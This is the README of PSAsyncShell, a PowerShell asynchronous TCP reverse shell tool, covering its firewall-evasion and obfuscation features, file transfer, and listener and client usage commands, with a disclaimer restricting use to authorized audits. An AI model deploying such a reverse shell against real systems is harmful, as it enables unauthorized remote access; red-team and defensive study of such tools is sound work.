<p align="center"><img width=600 alt="PSAsyncShell" src="https://github.com/JoelGMSec/PSAsyncShell/blob/main/PSAsyncShell.png"></p>

# PSAsyncShell
**PSAsyncShell** is an Asynchronous TCP Reverse Shell written in pure PowerShell. 

Unlike other reverse shells, all the communication and execution flow is done asynchronously, allowing to bypass some firewalls and some countermeasures against this kind of remote connections.

Additionally, this tool features command history, screen wiping, file uploading and downloading, information splitting through chunks and reverse Base64 URL encoded and obfuscated traffic.


# Requirements
- PowerShell 4.0 or greater


# Download
It is recommended to clone the complete repository or download the zip file.
You can do this by running the following command:
```
git clone https://github.com/JoelGMSec/PSAsyncShell
```


# Usage
```
.\PSAsyncShell.ps1 -h

  ____  ____    _                         ____  _          _ _
 |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | |
 | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | |
 |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | |
 |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_|
                         |___/

  ---------------------- by @JoelGMSec -----------------------

 Info:  This tool helps you to get a remote shell
        over asynchronous TCP to bypass firewalls

 Usage: .\PSAsyncShell.ps1 -s -p listen_port
          Listen for a new connection from the client

        .\PSAsyncShell.ps1 -c server_ip server_port
          Connect the client to a PSAsyncShell server

 Warning: All data will be sent unencrypted
          Upload function doesn't use MultiPart

```

### The detailed guide of use can be found at the following link:

https://darkbyte.net/psasyncshell-bypasseando-firewalls-con-una-shell-tcp-asincrona


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This tool has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can find me on Twitter as [@JoelGMSec](https://twitter.com/JoelGMSec) and on my blog [darkbyte.net](https://darkbyte.net).


# Support
You can support my work buying me a coffee:

[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png">](https://www.buymeacoffee.com/joelgmsec)
